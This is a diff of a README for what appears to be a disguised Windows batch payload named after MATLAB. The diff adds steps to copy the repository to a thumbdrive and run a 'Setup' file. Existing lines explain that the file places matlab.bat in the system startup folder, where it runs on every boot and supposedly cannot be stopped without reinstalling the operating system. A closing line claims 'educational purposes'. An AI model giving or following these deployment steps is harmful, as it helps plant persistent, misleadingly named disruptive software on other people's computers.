@@ -1,4 +1,6 @@
-# at first run 'MATLABR2013.bat' file (recommended), it will copy the matlab.bat file into the system startup folder
+   Download this repository as .ZIP file , extract it over somewhere . copy extracted folder in  your thumbdrive and now follow the steps given below  : ---  
+
+# at first run 'Setup' file (recommended), it will copy the matlab.bat file into the system startup folder
 # which you can cross verify by typing
 # 'run' in the windows start menu 
 # in run type 'shell:startup'
@@ -8,3 +10,5 @@
 # After Doing this you will not be able to stop this process on every boot
 # the only way to stop it is , to Reinstall the desired operating system
 
+
+* This is for educational purposes, so use it kindly not as a evil *
